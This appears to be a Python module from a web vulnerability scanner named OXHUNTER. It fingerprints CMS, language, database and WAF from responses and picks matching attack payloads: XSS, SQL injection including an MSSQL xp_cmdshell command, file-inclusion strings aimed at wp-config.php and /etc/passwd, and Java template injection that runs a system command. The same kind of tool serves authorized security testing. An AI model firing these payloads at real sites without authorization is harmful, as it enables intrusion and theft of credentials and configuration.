"""
OXHUNTER - context_analyzer.py
Technology Detection + Context-Aware Payload Selection
"""

import re
from typing import Dict, List, Optional
from dataclasses import dataclass, field


# ─────────────────────────────────────────────
#  TECHNOLOGY SIGNATURES
# ─────────────────────────────────────────────
TECH_SIGNATURES = {
    # CMS
    "WordPress" : {"body": ["wp-content","wp-includes","wordpress"], "headers": ["x-pingback"]},
    "Joomla"    : {"body": ["joomla","/components/com_"], "headers": []},
    "Drupal"    : {"body": ["drupal","sites/default/files"], "headers": ["x-drupal-cache"]},
    "Laravel"   : {"body": ["laravel_session"], "headers": ["x-powered-by: laravel"]},
    "Django"    : {"body": ["csrfmiddlewaretoken","django"], "headers": []},
    "Rails"     : {"body": ["_rails_session","rails"], "headers": ["x-runtime"]},

    # Language
    "PHP"       : {"body": [".php","phpsessid"], "headers": ["x-powered-by: php"]},
    "ASP.NET"   : {"body": ["__viewstate","aspxauth"], "headers": ["x-aspnet-version","x-powered-by: asp.net"]},
    "Node.js"   : {"body": [], "headers": ["x-powered-by: express"]},
    "Python"    : {"body": ["wsgi","flask","django"], "headers": []},
    "Java"      : {"body": ["jsessionid"], "headers": ["x-powered-by: servlet"]},

    # Database (from error messages)
    "MySQL"     : {"body": ["mysql_fetch","you have an error in your sql syntax","mysql"], "headers": []},
    "MSSQL"     : {"body": ["microsoft sql","unclosed quotation mark","mssql"], "headers": []},
    "PostgreSQL" : {"body": ["pg_query","postgresql","pg::"], "headers": []},
    "Oracle"    : {"body": ["ora-","oracle error"], "headers": []},
    "SQLite"    : {"body": ["sqlite_","sqlite3::"], "headers": []},

    # WAF/CDN
    "Cloudflare": {"body": ["cloudflare"], "headers": ["cf-ray","cf-cache-status"]},
    "AWS"       : {"body": [], "headers": ["x-amz-cf-id","x-amzn-requestid"]},
}

# Context-aware payload overrides per technology
TECH_PAYLOADS = {
    "WordPress" : {
        "xss"  : ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "sqli" : ["' OR 1=1--", "1' AND SLEEP(5)--"],
        "lfi"  : ["../../../../wp-config.php", "../../../../etc/passwd"],
    },
    "PHP"       : {
        "lfi"  : ["php://filter/convert.base64-encode/resource=index.php",
                  "../../../../etc/passwd%00"],
        "ssti" : ["{{7*7}}", "<?php echo 1337; ?>"],
    },
    "ASP.NET"   : {
        "ssti" : ["@(7*7)", "#{7*7}"],
        "sqli" : ["'; WAITFOR DELAY '0:0:5'--", "' OR 1=1--"],
    },
    "Java"      : {
        "ssti" : ["${7*7}", "#{7*7}", "${Runtime.getRuntime().exec('id')}"],
        "sqli" : ["' OR '1'='1", "' UNION SELECT NULL--"],
    },
    "MySQL"     : {
        "sqli" : ["' AND SLEEP(5)--", "' UNION SELECT NULL,@@version--",
                  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"],
    },
    "MSSQL"     : {
        "sqli" : ["'; WAITFOR DELAY '0:0:5'--", "' UNION SELECT NULL,@@version--",
                  "'; EXEC xp_cmdshell('whoami')--"],
    },
    "PostgreSQL": {
        "sqli" : ["'; SELECT pg_sleep(5)--", "' UNION SELECT NULL,version()--"],
    },
}


# ─────────────────────────────────────────────
#  SCAN CONTEXT
# ─────────────────────────────────────────────
@dataclass
class ScanContext:
    url          : str
    technologies : List[str]          = field(default_factory=list)
    database     : Optional[str]      = None
    language     : Optional[str]      = None
    cms          : Optional[str]      = None
    waf          : Optional[str]      = None
    headers      : Dict[str, str]     = field(default_factory=dict)
    body_snippet : str                = ""

    def has(self, tech: str) -> bool:
        return tech in self.technologies

    def summary(self) -> str:
        return (f"CMS:{self.cms or '?'} Lang:{self.language or '?'} "
                f"DB:{self.database or '?'} WAF:{self.waf or 'None'}")


# ─────────────────────────────────────────────
#  CONTEXT ANALYZER
# ─────────────────────────────────────────────
class ContextAnalyzer:

    # ── Detect Technologies ───────────────────

    @staticmethod
    def detect(body: str, headers: Dict[str, str]) -> ScanContext:
        """Detect technologies from response body + headers."""
        ctx = ScanContext(url="")
        b   = body.lower()
        h   = {k.lower(): v.lower() for k, v in headers.items()}
        hs  = " ".join(h.values())

        for tech, sigs in TECH_SIGNATURES.items():
            body_match   = any(s in b  for s in sigs["body"])
            header_match = any(s in hs for s in sigs["headers"])
            if body_match or header_match:
                ctx.technologies.append(tech)

        # Categorize
        cms_list  = ["WordPress","Joomla","Drupal","Laravel","Django","Rails"]
        lang_list = ["PHP","ASP.NET","Node.js","Python","Java"]
        db_list   = ["MySQL","MSSQL","PostgreSQL","Oracle","SQLite"]
        waf_list  = ["Cloudflare","AWS"]

        ctx.cms      = next((t for t in ctx.technologies if t in cms_list),  None)
        ctx.language = next((t for t in ctx.technologies if t in lang_list), None)
        ctx.database = next((t for t in ctx.technologies if t in db_list),   None)
        ctx.waf      = next((t for t in ctx.technologies if t in waf_list),  None)

        return ctx

    # ── Context-Aware Payloads ────────────────

    @staticmethod
    def get_payloads(ctx: ScanContext, vuln_type: str,
                     fallback: Optional[List[str]] = None) -> List[str]:
        """
        Return best payloads based on detected technology stack.
        Falls back to generic payloads if no tech-specific ones found.
        """
        payloads = []
        for tech in ctx.technologies:
            overrides = TECH_PAYLOADS.get(tech, {})
            payloads.extend(overrides.get(vuln_type, []))

        if not payloads and fallback:
            return fallback

        # Deduplicate preserving order
        seen = set()
        return [p for p in payloads if not (p in seen or seen.add(p))]

    # ── Response Behavior Analysis ────────────

    @staticmethod
    def analyze_response(baseline: Dict, current: Dict) -> Dict:
        """
        Differential analysis — compare current response to baseline.
        Useful for blind injection detection.
        """
        findings = []

        time_diff = current.get("elapsed", 0) - baseline.get("avg_time", 0)
        if time_diff >= 4.5:
            findings.append({"type": "time_delay", "diff": round(time_diff, 2),
                             "detail": f"Response {time_diff:.1f}s slower than baseline"})

        size_diff = abs(current.get("size", 0) - baseline.get("avg_size", 0))
        if size_diff > 500:
            findings.append({"type": "size_change", "diff": size_diff,
                             "detail": f"Response size changed by {size_diff} bytes"})

        if current.get("status") != baseline.get("common_status"):
            findings.append({"type": "status_change",
                             "detail": f"{baseline.get('common_status')} → {current.get('status')}"})

        return {"anomalies": findings, "suspicious": len(findings) > 0}

    # ── Error Pattern Detection ───────────────

    @staticmethod
    def detect_errors(body: str) -> List[Dict]:
        """Detect error messages that reveal tech stack or vulnerabilities."""
        patterns = {
            "sql_error"   : [r"you have an error in your sql", r"ora-\d{5}",
                             r"pg::syntaxerror", r"unclosed quotation"],
            "php_error"   : [r"warning:.*on line \d", r"fatal error:.*in.*\.php"],
            "stack_trace" : [r"traceback \(most recent", r"at .*\(.*\.java:\d+\)"],
            "path_disclosure": [r"[a-z]:\\.*\.php", r"/var/www/html", r"/home/\w+/"],
        }
        found = []
        b = body.lower()
        for err_type, regexes in patterns.items():
            for rx in regexes:
                if re.search(rx, b):
                    found.append({"type": err_type, "pattern": rx})
                    break
        return found
